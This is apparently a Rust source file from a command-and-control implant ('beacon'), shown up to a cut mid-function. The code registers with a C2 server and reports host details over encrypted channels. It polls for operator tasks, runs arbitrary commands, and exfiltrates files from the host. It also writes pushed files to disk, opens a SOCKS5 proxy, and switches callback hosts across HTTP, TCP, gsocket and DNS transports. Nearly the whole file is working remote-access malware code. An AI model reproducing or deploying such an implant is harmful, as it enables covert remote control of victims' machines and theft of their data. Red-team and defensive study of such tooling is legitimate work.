use std::collections::{HashMap, HashSet, VecDeque};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex, RwLock};
use std::time::Duration;

use nw_profile::{
    config::GSocketConfig,
    crypto,
    envelope::{Envelope, Kind},
    msgs::{FileAck, PollReply, PollRequest, Register, RegisterAck, Task, TaskResult},
};
use uuid::Uuid;

use crate::download::Download;
use crate::metadata;
use crate::runner;
use crate::transport::Transport;
use crate::upload::Upload;

/// What the implant is configured with before it knows its session id.
#[derive(Clone, Debug)]
pub struct Profile {
    pub endpoint: String,
    pub interval: Duration,
    pub jitter: Duration,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    pub addr: String,
}

/// Gather machine metadata for the register handshake.
pub fn discover_profile(endpoint: String, interval: Duration, jitter: Duration) -> Profile {
    let host = metadata::discover(&endpoint, interval, jitter);
    Profile {
        endpoint,
        interval,
        jitter,
        hostname: host.hostname,
        username: host.username,
        os: host.os,
        arch: host.arch,
        pid: host.pid,
        addr: host.local_addr.unwrap_or_else(|| "unknown".to_owned()),
    }
}

/// Runtime beacon state shared between the loop and the exit handler.
pub struct BeaconRuntime {
    pub profile: Profile,
    transport: RwLock<Transport>,
    session_id: RwLock<Option<Uuid>>,
    key: RwLock<[u8; crypto::KEY_LEN]>,
    pending: Mutex<Vec<TaskResult>>,
    accepted_task_ids: Mutex<VecDeque<Uuid>>,
    task_states: Mutex<HashMap<Uuid, ActiveTask>>,
    completed: Mutex<BoundedIds>,
    download: RwLock<Option<ActiveDownload>>,
    upload: RwLock<Option<ActiveUpload>>,
    #[cfg(test)]
    upload_install_barrier: Mutex<
        Option<(
            tokio::sync::mpsc::UnboundedSender<()>,
            Arc<tokio::sync::Notify>,
        )>,
    >,
    stop: AtomicBool,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum TransferPhase {
    Active,
    Finalizing,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum TransferDecision {
    Active,
    Cancelled,
    Terminal,
}

struct TransferControl {
    decision: Mutex<TransferDecision>,
}

impl TransferControl {
    fn new() -> Self {
        Self {
            decision: Mutex::new(TransferDecision::Active),
        }
    }

    fn request_cancel(&self) -> bool {
        let mut decision = self.decision.lock().unwrap();
        if *decision != TransferDecision::Active {
            return false;
        }
        *decision = TransferDecision::Cancelled;
        true
    }

    fn decide_result(&self, result: TaskResult) -> Option<TaskResult> {
        let mut decision = self.decision.lock().unwrap();
        match *decision {
            TransferDecision::Active => {
                *decision = TransferDecision::Terminal;
                Some(result)
            }
            TransferDecision::Cancelled => {
                *decision = TransferDecision::Terminal;
                Some(cancelled_result(result.task_id))
            }
            TransferDecision::Terminal => None,
        }
    }
}

struct ActiveUpload {
    transfer: Option<Upload>,
    control: Arc<TransferControl>,
    completion: Option<tokio::sync::oneshot::Sender<TaskResult>>,
    phase: TransferPhase,
    task_id: Uuid,
    #[cfg(test)]
    terminal_barriers: Option<(Arc<std::sync::Barrier>, Arc<std::sync::Barrier>)>,
}

impl ActiveUpload {
    fn new(
        transfer: Upload,
        control: Arc<TransferControl>,
        completion: tokio::sync::oneshot::Sender<TaskResult>,
    ) -> Self {
        let task_id = transfer.task_id();
        Self {
            transfer: Some(transfer),
            control,
            completion: Some(completion),
            phase: TransferPhase::Active,
            task_id,
            #[cfg(test)]
            terminal_barriers: None,
        }
    }

    fn task_id(&self) -> Uuid {
        self.task_id
    }

    #[cfg(test)]
    fn set_terminal_barriers(
        &mut self,
        reached: Arc<std::sync::Barrier>,
        release: Arc<std::sync::Barrier>,
    ) {
        self.terminal_barriers = Some((reached, release));
    }
}

struct ActiveDownload {
    transfer: Option<Download>,
    control: Arc<TransferControl>,
    completion: Option<tokio::sync::oneshot::Sender<TaskResult>>,
    phase: TransferPhase,
    task_id: Uuid,
    #[cfg(test)]
    terminal_barriers: Option<(Arc<std::sync::Barrier>, Arc<std::sync::Barrier>)>,
}

impl ActiveDownload {
    fn new(
        transfer: Download,
        control: Arc<TransferControl>,
        completion: tokio::sync::oneshot::Sender<TaskResult>,
    ) -> Self {
        let task_id = transfer.task_id();
        Self {
            transfer: Some(transfer),
            control,
            completion: Some(completion),
            phase: TransferPhase::Active,
            task_id,
            #[cfg(test)]
            terminal_barriers: None,
        }
    }

    fn task_id(&self) -> Uuid {
        self.task_id
    }

    #[cfg(test)]
    fn set_terminal_barriers(
        &mut self,
        reached: Arc<std::sync::Barrier>,
        release: Arc<std::sync::Barrier>,
    ) {
        self.terminal_barriers = Some((reached, release));
    }
}

const TASK_ID_MEMORY_LIMIT: usize = 4096;

#[derive(Default)]
struct BoundedIds {
    order: VecDeque<Uuid>,
    ids: HashSet<Uuid>,
}

enum ActiveTask {
    Accepted,
    Running(tokio::task::AbortHandle),
    Transfer(Arc<TransferControl>),
    Completing,
    Cancelled,
}

impl BoundedIds {
    fn contains(&self, id: &Uuid) -> bool {
        self.ids.contains(id)
    }

    fn insert(&mut self, id: Uuid) -> bool {
        if !self.ids.insert(id) {
            return false;
        }
        self.order.push_back(id);
        while self.order.len() > TASK_ID_MEMORY_LIMIT {
            if let Some(expired) = self.order.pop_front() {
                self.ids.remove(&expired);
            }
        }
        true
    }
}

fn cancelled_result(task_id: Uuid) -> TaskResult {
    TaskResult {
        task_id,
        ok: false,
        stdout: Vec::new(),
        stderr: b"task cancelled".to_vec(),
        exit_code: -1,
    }
}

fn poll_request_envelope(
    key: &[u8; crypto::KEY_LEN],
    request_id: u64,
    session_id: Uuid,
    request: &PollRequest,
) -> Result<Envelope, AnyError> {
    let plaintext = serde_json::to_vec(request).map_err(|error| AnyError(error.to_string()))?;
    let encrypted = crypto::encrypt(key, request_id, &plaintext)
        .map_err(|error| AnyError(error.to_string()))?;
    Ok(Envelope::new(
        Kind::TaskResult,
        request_id,
        Some(session_id),
        encrypted,
    ))
}

fn poll_request_fits(
    key: &[u8; crypto::KEY_LEN],
    request_id: u64,
    session_id: Uuid,
    request: &PollRequest,
    inner_budget: usize,
) -> Result<bool, AnyError> {
    Ok(poll_request_envelope(key, request_id, session_id, request)?
        .seal(key)
        .map_err(|error| AnyError(error.to_string()))?
        .len()
        <= inner_budget)
}

/// Reserve fixed results/acknowledgements first, then fit a contiguous file
/// prefix against the actual bytes emitted by `Envelope::seal`.
fn fit_poll_request_to_budget(
    key: &[u8; crypto::KEY_LEN],
    request_id: u64,
    session_id: Uuid,
    inner_budget: usize,
    mut request: PollRequest,
) -> Result<Envelope, AnyError> {
    let chunks = std::mem::take(&mut request.file_chunks);
    if !poll_request_fits(key, request_id, session_id, &request, inner_budget)? {
        return Err(AnyError(
            "poll request fixed payload exceeds sealed wire budget".into(),
        ));
    }

    for chunk in chunks {
        request.file_chunks.push(chunk.clone());
        if poll_request_fits(key, request_id, session_id, &request, inner_budget)? {
            continue;
        }
        request.file_chunks.pop();
        if chunk.data.is_empty() {
            break;
        }

        let mut low = 1usize;
        let mut high = chunk.data.len();
        let mut fitted = None;
        while low <= high {
            let midpoint = low + (high - low) / 2;
            let mut truncated = chunk.clone();
            truncated.data.truncate(midpoint);
            request.file_chunks.push(truncated.clone());
            let fits = poll_request_fits(key, request_id, session_id, &request, inner_budget)?;
            request.file_chunks.pop();
            if fits {
                fitted = Some(truncated);
                low = midpoint + 1;
            } else {
                high = midpoint - 1;
            }
        }
        if let Some(chunk) = fitted {
            request.file_chunks.push(chunk);
        }
        break;
    }

    poll_request_envelope(key, request_id, session_id, &request)
}

impl BeaconRuntime {
    pub fn new(profile: Profile, psk: Vec<u8>) -> Self {
        Self::new_with_gsocket(profile, psk, None)
    }

    pub fn new_with_gsocket(
        profile: Profile,
        psk: Vec<u8>,
        gsocket: Option<GSocketConfig>,
    ) -> Self {
        let key = crypto::derive_key(&psk, b"nw-m1-salt");
        let transport = Transport::from_profile(&profile.endpoint, gsocket).unwrap_or_else(|e| {
            tracing::warn!("bad endpoint {:?}: {e}", profile.endpoint);
            Transport::Http {
                client: Default::default(),
                base: profile.endpoint.clone(),
            }
        });
        BeaconRuntime {
            profile,
            transport: RwLock::new(transport),
            session_id: RwLock::new(None),
            key: RwLock::new(key),
            pending: Mutex::new(Vec::new()),
            accepted_task_ids: Mutex::new(VecDeque::new()),
            task_states: Mutex::new(HashMap::new()),
            completed: Mutex::new(BoundedIds::default()),
            download: RwLock::new(None),
            upload: RwLock::new(None),
            #[cfg(test)]
            upload_install_barrier: Mutex::new(None),
            stop: AtomicBool::new(false),
        }
    }

    #[cfg(test)]
    fn set_upload_install_barrier(
        &self,
        reached: tokio::sync::mpsc::UnboundedSender<()>,
        release: Arc<tokio::sync::Notify>,
    ) {
        *self.upload_install_barrier.lock().unwrap() = Some((reached, release));
    }

    pub fn trigger_stop(&self) {
        self.stop.store(true, Ordering::SeqCst);
    }

    pub fn should_stop(&self) -> bool {
        self.stop.load(Ordering::SeqCst)
    }

    /// Force-kill an in-flight task by task id. Returns true if a child was
    /// terminated. The awaiting runner turns the killed child into a result.
    pub async fn kill_task(&self, task_id: &Uuid) -> bool {
        let mut states = self.task_states.lock().unwrap();
        let transfer_control = match states.get(task_id) {
            Some(ActiveTask::Running(handle)) => {
                handle.abort();
                states.insert(*task_id, ActiveTask::Cancelled);
                return true;
            }
            Some(ActiveTask::Accepted | ActiveTask::Cancelled) => {
                states.insert(*task_id, ActiveTask::Cancelled);
                return true;
            }
            Some(ActiveTask::Transfer(control)) => Arc::clone(control),
            Some(ActiveTask::Completing) | None => return false,
        };
        drop(states);
        if !transfer_control.request_cancel() {
            return false;
        }

        let mut upload = self.upload.write().unwrap();
        if upload
            .as_ref()
            .is_some_and(|active| active.task_id() == *task_id)
        {
            if upload.as_ref().unwrap().phase == TransferPhase::Active {
                let mut active = upload.take().unwrap();
                self.task_states
                    .lock()
                    .unwrap()
                    .insert(*task_id, ActiveTask::Completing);
                if let Some(transfer) = active.transfer.take() {
                    let _ = transfer.cancel();
                }
                if let Some(completion) = active.completion.take() {
                    let _ = completion.send(cancelled_result(*task_id));
                }
            }
            return true;
        }
        drop(upload);

        let mut download = self.download.write().unwrap();
        if download
            .as_ref()
            .is_some_and(|active| active.task_id() == *task_id)
        {
            if download.as_ref().unwrap().phase == TransferPhase::Active {
                let mut active = download.take().unwrap();
                self.task_states
                    .lock()
                    .unwrap()
                    .insert(*task_id, ActiveTask::Completing);
                active.transfer.take();
                if let Some(completion) = active.completion.take() {
                    let _ = completion.send(cancelled_result(*task_id));
                }
            }
        }
        true
    }

    fn accept_task(&self, task_id: Uuid) -> bool {
        if self.completed.lock().unwrap().contains(&task_id)
            || self
                .pending
                .lock()
                .unwrap()
                .iter()
                .any(|result| result.task_id == task_id)
        {
            return false;
        }
        let mut states = self.task_states.lock().unwrap();
        if states.contains_key(&task_id) || states.len() >= TASK_ID_MEMORY_LIMIT {
            return false;
        }
        states.insert(task_id, ActiveTask::Accepted);
        drop(states);
        self.accepted_task_ids.lock().unwrap().push_back(task_id);
        true
    }

    pub fn set_endpoint(&self, url: String) -> Result<(), String> {
        let t = Transport::from_endpoint(&url)?;
        *self.transport.write().unwrap() = t;
        Ok(())
    }

    fn next_id(&self) -> u64 {
        use std::sync::atomic::AtomicU64;
        static COUNTER: AtomicU64 = AtomicU64::new(1);
        COUNTER.fetch_add(1, Ordering::SeqCst)
    }

    async fn exchange(&self, env: &Envelope) -> Result<Envelope, AnyError> {
        let transport = self.transport.read().unwrap().clone();
        let key = { *self.key.read().unwrap() };
        let sealed = env.seal(&key).map_err(|e| AnyError(e.to_string()))?;
        let raw = transport
            .exchange(sealed.as_bytes())
            .await
            .map_err(AnyError)?;
        let wire = std::str::from_utf8(&raw).map_err(|e| AnyError(e.to_string()))?;
        Envelope::open(&key, wire).map_err(|e| AnyError(e.to_string()))
    }

    /// Register with the C2 and stash the assigned session id.
    async fn register(&self) -> Result<Uuid, AnyError> {
        let id = self.next_id();
        // Roll a fresh ephemeral x25519 key for this registration.
        let kp = crypto::KeyPair::generate();
        let metadata = metadata::discover(
            &self.profile.endpoint,
            self.profile.interval,
            self.profile.jitter,
        );
        let reg = Register {
            hostname: self.profile.hostname.clone(),
            username: self.profile.username.clone(),
            os: self.profile.os.clone(),
            arch: self.profile.arch.clone(),
            pid: self.profile.pid,
            addr: self.profile.addr.clone(),
            os_version: metadata.os_version,
            executable_path: metadata.executable_path,
            local_addr: metadata.local_addr,
            implant_version: Some(metadata.implant_version),
            interval_ms: Some(metadata.interval_ms),
            jitter_ms: Some(metadata.jitter_ms),
            capabilities: Some(metadata.capabilities),
            session_key: encode_key(&kp.public_key()),
        };
        // The register handshake and its ack ride the PSK key; only after
        // deriving the DH session key does the volatile self.key switch over.
        let pt = serde_json::to_vec(&reg).map_err(|e| AnyError(e.to_string()))?;
        let ct =
            crypto::encrypt(&self.session_key(), id, &pt).map_err(|e| AnyError(e.to_string()))?;
        let env = Envelope::new(Kind::Register, id, None, ct);
        let reply = self.exchange(&env).await?;
        if reply.kind != Kind::RegisterAck {
            return Err(AnyError(format!(
                "unexpected register reply kind {:?}",
                reply.kind
            )));
        }
        let ack_pt = crypto::decrypt(&self.session_key(), reply.id, &reply.encrypted)
            .map_err(|e| AnyError(e.to_string()))?;
        let ack: RegisterAck =
            serde_json::from_slice(&ack_pt).map_err(|e| AnyError(e.to_string()))?;
        // Derive the forward-secret session key from our ephemeral secret and
        // the server's ephemeral public key; every next frame uses this key.
        let server_pub = decode_key(&ack.server_pub).map_err(|e| AnyError(e.to_string()))?;
        let shared = kp
            .shared_secret(&server_pub)
            .map_err(|e| AnyError(e.to_string()))?;
        *self.key.write().unwrap() = crypto::derive_key(&shared, crypto::SESSION_SALT);
        tracing::debug!(session = %ack.session_id, "registered");
        Ok(ack.session_id)
    }

    /// Send buffered results + download chunks; pull new tasks and apply file
    /// acks (resume points).
    async fn poll(&self, sid: Uuid) -> Result<Vec<Task>, AnyError> {
        let id = self.next_id();
        let results = self.pending.lock().unwrap().clone();
        let accepted_task_ids: Vec<Uuid> = self
            .accepted_task_ids
            .lock()
            .unwrap()
            .iter()
            .copied()
            .collect();

        // Stream the active download: hand the transport as many chunks as fit
        // this beacon, up to its per-frame inner budget.
        let file_chunks = {
            let budget = self.transport.read().unwrap().inner_budget();
            let mut dl = self.download.write().unwrap();
            match dl.as_mut() {
                Some(active) => {
                    // Wait for the completion ack before reporting done.
                    active
                        .transfer
                        .as_mut()
                        .map(|download| download.step(budget))
                        .unwrap_or_default()
                }
                None => Vec::new(),
            }
        };

        // Acks for the server->implant upload (reflect last-reply write state).
        let upload_acks = {
            let up = self.upload.read().unwrap();
            up.as_ref()
                .and_then(|active| active.transfer.as_ref())
                .map(|upload| vec![upload.ack()])
                .unwrap_or_default()
        };
        let inner_budget = self.transport.read().unwrap().inner_budget();

        let req = PollRequest {
            results,
            acked_ids: accepted_task_ids.clone(),
            accepted_task_ids: accepted_task_ids.clone(),
            file_chunks,
            upload_acks,
            inner_budget,
        };
        let env = fit_poll_request_to_budget(&self.session_key(), id, sid, inner_budget, req)?;
        let reply = self.exchange(&env).await?;
        let pt = crypto::decrypt(&self.session_key(), reply.id, &reply.encrypted)
            .map_err(|e| AnyError(e.to_string()))?;
        let pr: PollReply = serde_json::from_slice(&pt).map_err(|e| AnyError(e.to_string()))?;

        // A successfully decoded reply proves the server received this request.
        // Retain newer acceptances queued while the exchange was in flight.
        let sent: HashSet<_> = accepted_task_ids.into_iter().collect();
        self.accepted_task_ids
            .lock()
            .unwrap()
            .retain(|task_id| !sent.contains(task_id));
        if !pr.result_acks.is_empty() {
            let result_acks: HashSet<_> = pr.result_acks.iter().copied().collect();
            self.pending
                .lock()
                .unwrap()
                .retain(|result| !result_acks.contains(&result.task_id));
        }

        // Apply resume acks and finalize the completed download.
        for ack in pr.acks {
            let download_matches = self
                .download
                .read()
                .unwrap()
                .as_ref()
                .is_some_and(|active| {
                    active
                        .transfer
                        .as_ref()
                        .is_some_and(|download| ack.transfer_id == Some(download.transfer_id()))
                });
            if download_matches && ack.done {
                self.finalize_download(ack).await;
            } else if download_matches {
                if let Some(download) = self
                    .download
                    .write()
                    .unwrap()
                    .as_mut()
                    .and_then(|active| active.transfer.as_mut())
                {
                    download.resume_to(ack.received);
                }
            }

            let upload_matches = self.upload.read().unwrap().as_ref().is_some_and(|active| {
                active
                    .transfer
                    .as_ref()
                    .is_some_and(|upload| ack.transfer_id == Some(upload.transfer_id()))
            });
            if upload_matches && ack.done {
                self.finalize_upload(ack).await;
            }
        }

        // Write any server->implant upload chunks; finalize when fully received.
        if !pr.push_chunks.is_empty() {
            let failure = {
                let mut slot = self.upload.write().unwrap();
                let mut error = None;
                if let Some(active) = slot.as_mut()
                    && active.phase == TransferPhase::Active
                    && let Some(upload) = active.transfer.as_mut()
                {
                    for chunk in &pr.push_chunks {
                        if let Err(write_error) = upload.write_chunk(chunk) {
                            error = Some(write_error);
                            break;
                        }
                    }
                }
                error.and_then(|error| {
                    let active = slot.as_mut()?;
                    active.phase = TransferPhase::Finalizing;
                    Some((
                        active.transfer.take()?,
                        Arc::clone(&active.control),
                        active.task_id,
                        error,
                    ))
                })
            };
            if let Some((upload, control, task_id, error)) = failure {
                let result = {
                    let mut decision = control.decision.lock().unwrap();
                    match *decision {
                        TransferDecision::Cancelled => {
                            drop(decision);
                            let _ = upload.cancel();
                            Some(cancelled_result(task_id))
                        }
                        TransferDecision::Active => {
                            let _ = upload.cancel();
                            *decision = TransferDecision::Terminal;
                            Some(TaskResult {
                                task_id,
                                ok: false,
                                stdout: Vec::new(),
                                stderr: error.into_bytes(),
                                exit_code: -1,
                            })
                        }
                        TransferDecision::Terminal => None,
                    }
                };
                if let Some(result) = result {
                    let mut slot = self.upload.write().unwrap();
                    if slot.as_ref().is_some_and(|active| {
                        active.task_id() == task_id && active.phase == TransferPhase::Finalizing
                    }) {
                        let mut active = slot.take().unwrap();
                        self.task_states
                            .lock()
                            .unwrap()
                            .insert(task_id, ActiveTask::Completing);
                        if let Some(completion) = active.completion.take() {
                            let _ = completion.send(result);
                        }
                    }
                }
            }
        }
        let mut accepted_now = Vec::new();
        for task in pr.tasks {
            if self.accept_task(task.id) {
                accepted_now.push(task);
            }
        }
        Ok(accepted_now)
    }

    /// Run one returned task, buffering its result for the next poll. Also
    /// handles the implanted local commands (`nw/*`). Sync wrapper; the unit
    /// tests drive this directly, the beacon loop spawns it per task.
    async fn execute(self: Arc<Self>, tasks: Vec<Task>) {
        let mut monitors = Vec::new();
        for task in tasks {
            let task_id = task.id;
            let mut states = self.task_states.lock().unwrap();
            match states.get(&task_id) {
                Some(ActiveTask::Cancelled) => {
                    states.remove(&task_id);
                    drop(states);
                    self.pending.lock().unwrap().push(TaskResult {
                        task_id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: b"task cancelled".to_vec(),
                        exit_code: -1,
                    });
                    self.completed.lock().unwrap().insert(task_id);
                    continue;
                }
                Some(ActiveTask::Running(_) | ActiveTask::Transfer(_) | ActiveTask::Completing) => {
                    continue;
                }
                Some(ActiveTask::Accepted) => {}
                None if states.len() < TASK_ID_MEMORY_LIMIT => {
                    states.insert(task_id, ActiveTask::Accepted);
                }
                None => continue,
            }
            let transfer_control = matches!(task.command.as_str(), "nw/upload" | "nw/download")
                .then(|| Arc::new(TransferControl::new()));
            let runtime = Arc::clone(&self);
            let task_control = transfer_control.clone();
            let handle = tokio::spawn(async move { runtime.run_one(&task, task_control).await });
            states.insert(
                task_id,
                match transfer_control {
                    Some(control) => ActiveTask::Transfer(control),
                    None => ActiveTask::Running(handle.abort_handle()),
                },
            );
            drop(states);
            let runtime = Arc::clone(&self);
            monitors.push(tokio::spawn(async move {
                if let Err(error) = handle.await {
                    runtime.pending.lock().unwrap().push(TaskResult {
                        task_id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: if error.is_cancelled() {
                            b"task cancelled".to_vec()
                        } else {
                            format!("task join error: {error}").into_bytes()
                        },
                        exit_code: -1,
                    });
                }
                runtime.task_states.lock().unwrap().remove(&task_id);
                runtime.completed.lock().unwrap().insert(task_id);
            }));
        }

        for monitor in monitors {
            let _ = monitor.await;
        }
    }

    /// Run one returned task, buffering its result for the next poll. Also
    /// handles the implanted local commands (`nw/*`).
    async fn run_one(&self, task: &Task, transfer_control: Option<Arc<TransferControl>>) {
        if let Some(result) = crate::modules::execute(task).await {
            self.pending.lock().unwrap().push(result);
            return;
        }
        if let Some(result) = crate::processes::execute(task) {
            self.pending.lock().unwrap().push(result);
            return;
        }
        if let Some(result) = crate::filesystem::execute(task) {
            self.pending.lock().unwrap().push(result);
            return;
        }
        if task.command == "nw/exit" {
            self.trigger_stop();
            return;
        }
        if task.command == "nw/sethost" {
            let result = match task.args.as_slice() {
                [url] => match self.set_endpoint(url.clone()) {
                    Ok(()) => TaskResult {
                        task_id: task.id,
                        ok: true,
                        stdout: format!("callback transport changed to {}", url).into_bytes(),
                        stderr: Vec::new(),
                        exit_code: 0,
                    },
                    Err(e) => TaskResult {
                        task_id: task.id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: format!(
                            "invalid callback URL {url:?}; {e}; expected http(s)://, tcp://, gs://, dns:// with host"
                        )
                        .into_bytes(),
                        exit_code: -1,
                    },
                },
                _ => TaskResult {
                    task_id: task.id,
                    ok: false,
                    stdout: Vec::new(),
                    stderr: b"usage: nw/sethost <base-url>".to_vec(),
                    exit_code: -1,
                },
            };
            self.pending.lock().unwrap().push(result);
            return;
        }
        if task.command == "nw/download" {
            match task.args.as_slice() {
                [path, transfer_id] => {
                    let control = transfer_control
                        .as_ref()
                        .expect("download task has transfer control");
                    let Ok(transfer_id) = Uuid::parse_str(transfer_id) else {
                        let result = TaskResult {
                            task_id: task.id,
                            ok: false,
                            stdout: Vec::new(),
                            stderr: b"invalid download transfer id".to_vec(),
                            exit_code: -1,
                        };
                        if let Some(result) = control.decide_result(result) {
                            self.pending.lock().unwrap().push(result);
                        }
                        return;
                    };
                    let completion = {
                        let mut decision = control.decision.lock().unwrap();
                        if *decision == TransferDecision::Cancelled {
                            *decision = TransferDecision::Terminal;
                            self.pending.lock().unwrap().push(cancelled_result(task.id));
                            None
                        } else {
                            let mut slot = self.download.write().unwrap();
                            if slot.is_some() {
                                *decision = TransferDecision::Terminal;
                                self.pending.lock().unwrap().push(TaskResult {
                                    task_id: task.id,
                                    ok: false,
                                    stdout: Vec::new(),
                                    stderr: b"a download is already in progress".to_vec(),
                                    exit_code: -1,
                                });
                                None
                            } else {
                                match Download::open(path, transfer_id, task.id) {
                                    Ok(d) => {
                                        let (sender, receiver) = tokio::sync::oneshot::channel();
                                        *slot = Some(ActiveDownload::new(
                                            d,
                                            Arc::clone(control),
                                            sender,
                                        ));
                                        Some(receiver)
                                    }
                                    Err(e) => {
                                        *decision = TransferDecision::Terminal;
                                        self.pending.lock().unwrap().push(TaskResult {
                                            task_id: task.id,
                                            ok: false,
                                            stdout: Vec::new(),
                                            stderr: e.into_bytes(),
                                            exit_code: -1,
                                        });
                                        None
                                    }
                                }
                            }
                        }
                    };
                    if let Some(completion) = completion
                        && let Ok(result) = completion.await
                    {
                        self.pending.lock().unwrap().push(result);
                    }
                }
                _ => {
                    let result = TaskResult {
                        task_id: task.id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: b"usage: nw/download <path> <transfer-id>".to_vec(),
                        exit_code: -1,
                    };
                    if let Some(result) = transfer_control
                        .as_ref()
                        .expect("download task has transfer control")
                        .decide_result(result)
                    {
                        self.pending.lock().unwrap().push(result);
                    }
                }
            }
            return;
        }
        if task.command == "nw/upload" {
            match task.args.as_slice() {
                [dest, transfer_id] | [dest, transfer_id, _] | [dest, transfer_id, _, _] => {
                    let control = transfer_control
                        .as_ref()
                        .expect("upload task has transfer control");
                    let Ok(transfer_id) = Uuid::parse_str(transfer_id) else {
                        let result = TaskResult {
                            task_id: task.id,
                            ok: false,
                            stdout: Vec::new(),
                            stderr: b"invalid upload transfer id".to_vec(),
                            exit_code: -1,
                        };
                        if let Some(result) = control.decide_result(result) {
                            self.pending.lock().unwrap().push(result);
                        }
                        return;
                    };
                    #[cfg(test)]
                    let install_barrier = { self.upload_install_barrier.lock().unwrap().take() };
                    #[cfg(test)]
                    if let Some((reached, release)) = install_barrier {
                        let _ = reached.send(());
                        release.notified().await;
                    }
                    let completion = {
                        let mut decision = control.decision.lock().unwrap();
                        if *decision == TransferDecision::Cancelled {
                            *decision = TransferDecision::Terminal;
                            self.pending.lock().unwrap().push(cancelled_result(task.id));
                            None
                        } else {
                            let mut slot = self.upload.write().unwrap();
                            if slot.is_some() {
                                *decision = TransferDecision::Terminal;
                                self.pending.lock().unwrap().push(TaskResult {
                                    task_id: task.id,
                                    ok: false,
                                    stdout: Vec::new(),
                                    stderr: b"an upload is already in progress".to_vec(),
                                    exit_code: -1,
                                });
                                None
                            } else {
                                let expected_total =
                                    task.args.get(2).and_then(|value| value.parse().ok());
                                match crate::upload::Upload::open_with_total(
                                    dest,
                                    transfer_id,
                                    task.id,
                                    expected_total,
                                    task.args.get(3).filter(|value| !value.is_empty()).cloned(),
                                ) {
                                    Ok(u) => {
                                        let (sender, receiver) = tokio::sync::oneshot::channel();
                                        *slot =
                                            Some(ActiveUpload::new(u, Arc::clone(control), sender));
                                        Some(receiver)
                                    }
                                    Err(e) => {
                                        *decision = TransferDecision::Terminal;
                                        self.pending.lock().unwrap().push(TaskResult {
                                            task_id: task.id,
                                            ok: false,
                                            stdout: Vec::new(),
                                            stderr: e.into_bytes(),
                                            exit_code: -1,
                                        });
                                        None
                                    }
                                }
                            }
                        }
                    };
                    if let Some(completion) = completion
                        && let Ok(result) = completion.await
                    {
                        self.pending.lock().unwrap().push(result);
                    }
                }
                _ => {
                    let result = TaskResult {
                        task_id: task.id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: b"usage: nw/upload <dest> <transfer-id>".to_vec(),
                        exit_code: -1,
                    };
                    if let Some(result) = transfer_control
                        .as_ref()
                        .expect("upload task has transfer control")
                        .decide_result(result)
                    {
                        self.pending.lock().unwrap().push(result);
                    }
                }
            }
            return;
        }
        if task.command == "nw/socks" {
            match task.args.as_slice() {
                [port] => match port.parse::<u16>() {
                    Ok(p) => {
                        let bind = format!("127.0.0.1:{p}");
                        // Bind synchronously so we can report success/failure
                        // to the operator, then run the accept loop detached.
                        match tokio::net::TcpListener::bind(&bind).await {
                            Ok(listener) => {
                                tokio::spawn(async move {
                                    if let Err(e) = crate::socks5::run(listener).await {
                                        tracing::warn!("socks5: {e}");
                                    }
                                });
                                self.pending.lock().unwrap().push(TaskResult {
                                    task_id: task.id,
                                    ok: true,
                                    stdout: format!("socks5 proxy listening on {bind}")
                                        .into_bytes(),
                                    stderr: Vec::new(),
                                    exit_code: 0,
                                });
                            }
                            Err(e) => self.pending.lock().unwrap().push(TaskResult {
                                task_id: task.id,
                                ok: false,
                                stdout: Vec::new(),
                                stderr: format!("socks5 bind {bind}: {e}").into_bytes(),
                                exit_code: -1,
                            }),
                        }
                    }
                    Err(_) => self.pending.lock().unwrap().push(TaskResult {
                        task_id: task.id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: b"usage: nw/socks <port>".to_vec(),
                        exit_code: -1,
                    }),
                },
                _ => self.pending.lock().unwrap().push(TaskResult {
                    task_id: task.id,
                    ok: false,
                    stdout: Vec::new(),
                    stderr: b"usage: nw/socks <port>".to_vec(),
                    exit_code: -1,
                }),
            }
            return;
        }
        if task.command == "nw/hashes" {
            match task.args.as_slice() {
                [path] => {
                    let result = match tokio::fs::read(path).await {
                        Ok(data) => {
                            use sha2::{Digest, Sha256};
                            let mut h = Sha256::new();
                            h.update(&data);
                            let digest = h.finalize();
                            let hex: String = digest.iter().map(|b| format!("{b:02x}")).collect();
                            TaskResult {
                                task_id: task.id,
                                ok: true,
                                stdout: format!("{hex}  {path}").into_bytes(),
                                stderr: Vec::new(),
                                exit_code: 0,
                            }
                        }
                        Err(e) => TaskResult {
                            task_id: task.id,
                            ok: false,
                            stdout: Vec::new(),
                            stderr: format!("hashes {path}: {e}").into_bytes(),
                            exit_code: -1,
                        },
                    };
                    self.pending.lock().unwrap().push(result);
                }
                _ => self.pending.lock().unwrap().push(TaskResult {
                    task_id: task.id,
                    ok: false,
                    stdout: Vec::new(),
                    stderr: b"usage: nw/hashes <path>".to_vec(),
                    exit_code: -1,
                }),
            }
            return;
        }
        if task.command == "nw/killtask" {
            match task.args.as_slice() {
                [id] => match Uuid::parse_str(id) {
                    Ok(tid) => {
                        let killed = self.kill_task(&tid).await;
                        self.pending.lock().unwrap().push(TaskResult {
                            task_id: task.id,
                            ok: killed,
                            stdout: if killed {
                                format!("killed {tid}").into_bytes()
                            } else {
                                Vec::new()
                            },
                            stderr: if killed {
                                Vec::new()
                            } else {
                                format!("no running task {tid}").into_bytes()
                            },
                            exit_code: if killed { 0 } else { -1 },
                        });
                    }
                    Err(_) => self.pending.lock().unwrap().push(TaskResult {
                        task_id: task.id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: b"usage: nw/killtask <task-uuid>".to_vec(),
                        exit_code: -1,
                    }),
                },
                _ => self.pending.lock().unwrap().push(TaskResult {
                    task_id: task.id,
                    ok: false,
                    stdout: Vec::new(),
                    stderr: b"usage: nw/killtask <task-uuid>".to_vec(),
                    exit_code: -1,
                }),
            }
            return;
        }
        let result = runner::run(task.clone()).await;
        self.pending.lock().unwrap().push(result);
    }

    async fn finalize_upload(&self, ack: FileAck) {
        let Some((upload, control, task_id, destination, terminal_barriers)) = ({
            let mut slot = self.upload.write().unwrap();
            let Some(active) = slot.as_mut() else {
                return;
            };
            if active.phase != TransferPhase::Active
                || !active
                    .transfer
                    .as_ref()
                    .is_some_and(|upload| ack.transfer_id == Some(upload.transfer_id()))
            {
